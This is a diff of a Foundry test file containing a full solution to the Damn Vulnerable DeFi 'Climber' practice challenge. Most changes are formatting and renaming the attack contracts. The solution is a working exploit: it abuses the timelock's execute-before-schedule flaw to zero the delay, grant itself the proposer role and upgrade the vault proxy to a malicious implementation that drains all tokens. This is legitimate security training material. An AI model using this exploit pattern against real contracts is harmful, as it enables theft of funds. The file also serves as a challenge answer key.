@@ -1,194 +1,189 @@
-    // SPDX-License-Identifier: MIT
-    // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
-    pragma solidity =0.8.25;
+// SPDX-License-Identifier: MIT
+// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
+pragma solidity =0.8.25;
 
-    import {Test, console} from "forge-std/Test.sol";
-    import {ClimberVault} from "../../src/climber/ClimberVault.sol";
-    import {
-        ClimberTimelock,
-        CallerNotTimelock,
-        PROPOSER_ROLE,
-        ADMIN_ROLE
-    } from "../../src/climber/ClimberTimelock.sol";
-    import {
-        ERC1967Proxy
-    } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
-    import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-    import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
-    import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-    import {
-        UUPSUpgradeable
-    } from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
-    import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
-    contract ClimberChallenge is Test {
-        address deployer = makeAddr("deployer");
-        address player = makeAddr("player");
-        address proposer = makeAddr("proposer");
-        address sweeper = makeAddr("sweeper");
-        address recovery = makeAddr("recovery");
+import {Test, console} from "forge-std/Test.sol";
+import {ClimberVault} from "../../src/climber/ClimberVault.sol";
+import {
+    ClimberTimelock,
+    CallerNotTimelock,
+    PROPOSER_ROLE,
+    ADMIN_ROLE
+} from "../../src/climber/ClimberTimelock.sol";
+import {
+    ERC1967Proxy
+} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {
+    UUPSUpgradeable
+} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
+contract ClimberChallenge is Test {
+    address deployer = makeAddr("deployer");
+    address player = makeAddr("player");
+    address proposer = makeAddr("proposer");
+    address sweeper = makeAddr("sweeper");
+    address recovery = makeAddr("recovery");
 
-        uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
-        uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
-        uint256 constant TIMELOCK_DELAY = 60 * 60;
+    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
+    uint256 constant TIMELOCK_DELAY = 60 * 60;
 
-        ClimberVault vault;
-        ClimberTimelock timelock;
-        DamnValuableToken token;
+    ClimberVault vault;
+    ClimberTimelock timelock;
+    DamnValuableToken token;
 
-        modifier checkSolvedByPlayer() {
-            vm.startPrank(player, player);
-            _;
-            vm.stopPrank();
-            _isSolved();
-        }
+    modifier checkSolvedByPlayer() {
+        vm.startPrank(player, player);
+        _;
+        vm.stopPrank();
+        _isSolved();
+    }
 
-        /**
-        * SETS UP CHALLENGE - DO NOT TOUCH
-        */
-        function setUp() public {
-            startHoax(deployer);
-            vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
+    /**
+     * SETS UP CHALLENGE - DO NOT TOUCH
+     */
+    function setUp() public {
+        startHoax(deployer);
+        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
-            // Deploy the vault behind a proxy,
-            // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
-            vault = ClimberVault(
-                address(
-                    new ERC1967Proxy(
-                        address(new ClimberVault()), // implementation
-                        abi.encodeCall(
-                            ClimberVault.initialize,
-                            (deployer, proposer, sweeper)
-                        ) // initialization data
-                    )
+        // Deploy the vault behind a proxy,
+        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
+        vault = ClimberVault(
+            address(
+                new ERC1967Proxy(
+                    address(new ClimberVault()), // implementation
+                    abi.encodeCall(
+                        ClimberVault.initialize,
+                        (deployer, proposer, sweeper)
+                    ) // initialization data
                 )
-            );
+            )
+        );
 
-            // Get a reference to the timelock deployed during creation of the vault
-            timelock = ClimberTimelock(payable(vault.owner()));
+        // Get a reference to the timelock deployed during creation of the vault
+        timelock = ClimberTimelock(payable(vault.owner()));
 
-            // Deploy token and transfer initial token balance to the vault
-            token = new DamnValuableToken();
-            token.transfer(address(vault), VAULT_TOKEN_BALANCE);
+        // Deploy token and transfer initial token balance to the vault
+        token = new DamnValuableToken();
+        token.transfer(address(vault), VAULT_TOKEN_BALANCE);
 
-            vm.stopPrank();
-        }
-
-        /**
-        * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
-        */
-        function test_assertInitialState() public {
-            assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
-            assertEq(vault.getSweeper(), sweeper);
-            assertGt(vault.getLastWithdrawalTimestamp(), 0);
-            assertNotEq(vault.owner(), address(0));
-            assertNotEq(vault.owner(), deployer);
-
-            // Ensure timelock delay is correct and cannot be changed
-            assertEq(timelock.delay(), TIMELOCK_DELAY);
-            vm.expectRevert(CallerNotTimelock.selector);
-            timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));
-
-            // Ensure timelock roles are correctly initialized
-            assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
-            assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
-            assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));
-
-            assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
-        }
-
-        /**
-        * CODE YOUR SOLUTION HERE
-        */
-        function test_climber() public checkSolvedByPlayer {
-            Attack attack = new Attack();
-            Attack2 attack2 = new Attack2();
-            address[] memory targets = new address[](4);
-            // targets[0] = address(timelock);
-            targets[0] = address(vault);
-            targets[1] = address(timelock);
-            targets[2] = address(timelock);
-            targets[3] = address(attack2);
-            uint256[] memory values = new uint256[](4);
-            values[0] = 0;
-            values[1] = 0;
-            values[2] = 0;
-            values[3] = 0;
-
-            bytes[] memory dataElements = new bytes[](4);
-            bytes32 salt = keccak256("salt");
-
-            dataElements[0] = abi.encodeCall(
-                UUPSUpgradeable.upgradeToAndCall,
-                (address(attack), "")
-            );
-            dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
-            dataElements[2] = abi.encodeCall(
-                AccessControl.grantRole,
-                (keccak256("PROPOSER_ROLE"), address(attack2))
-            );
-            dataElements[3] = abi.encodeCall(
-                Attack2.run,
-                (targets, values, salt, timelock, address(attack))
-            );
-
-            timelock.execute(targets, values, dataElements, salt);
-
-            vault.sweepFunds(address(token));
-            // console.log(token.balanceOf(player),player,msg.sender,address(this));
-            token.transfer(recovery, token.balanceOf(player));
-        }
-
-        /**
-        * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
-        */
-        function _isSolved() private view {
-            assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-            assertEq(
-                token.balanceOf(recovery),
-                VAULT_TOKEN_BALANCE,
-                "Not enough tokens in recovery account"
-            );
-        }
+        vm.stopPrank();
     }
 
-    contract Attack is UUPSUpgradeable {
-        function _authorizeUpgrade(address newImplementation) internal override {}
+    /**
+     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
+     */
+    function test_assertInitialState() public {
+        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
+        assertEq(vault.getSweeper(), sweeper);
+        assertGt(vault.getLastWithdrawalTimestamp(), 0);
+        assertNotEq(vault.owner(), address(0));
+        assertNotEq(vault.owner(), deployer);
 
-        function sweepFunds(address token) external {
-            SafeTransferLib.safeTransfer(
-                token,
-                msg.sender,
-                IERC20(token).balanceOf(address(this))
-            );
-        }
+        // Ensure timelock delay is correct and cannot be changed
+        assertEq(timelock.delay(), TIMELOCK_DELAY);
+        vm.expectRevert(CallerNotTimelock.selector);
+        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));
+
+        // Ensure timelock roles are correctly initialized
+        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
+        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
+        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));
+
+        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
     }
-    contract Attack2 {
-        //   address[] memory targets = new address[](3);
-        //     uint256[] memory values = new uint256[](3);
-        //    bytes32 salt = keccak256("salt");
-        bytes[] dataElements = new bytes[](4);
 
-        function run(
-            address[] calldata targets,
-            uint256[] calldata values,
-            bytes32 salt,
-            ClimberTimelock timelock,
-            address attack
-        ) public {
-            dataElements[0] = abi.encodeCall(
-                UUPSUpgradeable.upgradeToAndCall,
-                (attack, "")
-            );
-            dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_climber() public checkSolvedByPlayer {
+        MaliciousImplementation newVault = new MaliciousImplementation();
+        ExploitTimelockExecute exploiter = new ExploitTimelockExecute();
+        address[] memory targets = new address[](4);
+        // targets[0] = address(timelock);
+        targets[0] = address(vault);
+        targets[1] = address(timelock);
+        targets[2] = address(timelock);
+        targets[3] = address(exploiter);
+        uint256[] memory values = new uint256[](4);
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
 
-            dataElements[2] = abi.encodeCall(
-                AccessControl.grantRole,
-                (keccak256("PROPOSER_ROLE"), address(this))
-            );
-            dataElements[3] = abi.encodeCall(
-                this.run,
-                (targets, values, salt, timelock, attack)
-            );
-            timelock.schedule(targets, values, dataElements, salt);
-        }
+        bytes[] memory dataElements = new bytes[](4);
+        bytes32 salt = keccak256("salt");
+
+        dataElements[0] = abi.encodeCall(
+            UUPSUpgradeable.upgradeToAndCall,
+            (address(newVault), "")
+        );
+        dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
+        dataElements[2] = abi.encodeCall(
+            AccessControl.grantRole,
+            (keccak256("PROPOSER_ROLE"), address(exploiter))
+        );
+        dataElements[3] = abi.encodeCall(
+            ExploitTimelockExecute.run,
+            (targets, values, salt, timelock, address(newVault))
+        );
+
+        timelock.execute(targets, values, dataElements, salt);
+
+        vault.sweepFunds(address(token));
+        token.transfer(recovery, token.balanceOf(player));
     }
+
+    /**
+     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
+     */
+    function _isSolved() private view {
+        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract MaliciousImplementation is UUPSUpgradeable {
+    function _authorizeUpgrade(address newImplementation) internal override {}
+
+    function sweepFunds(address token) external {
+        SafeTransferLib.safeTransfer(
+            token,
+            msg.sender,
+            IERC20(token).balanceOf(address(this))
+        );
+    }
+}
+contract ExploitTimelockExecute {
+    function run(
+        address[] calldata targets,
+        uint256[] calldata values,
+        bytes32 salt,
+        ClimberTimelock timelock,
+        address newVault
+    ) public {
+        bytes[] memory dataElements = new bytes[](4);
+        dataElements[0] = abi.encodeCall(
+            UUPSUpgradeable.upgradeToAndCall,
+            (newVault, "")
+        );
+        dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
+
+        dataElements[2] = abi.encodeCall(
+            AccessControl.grantRole,
+            (keccak256("PROPOSER_ROLE"), address(this))
+        );
+        dataElements[3] = abi.encodeCall(
+            this.run,
+            (targets, values, salt, timelock, newVault)
+        );
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+}
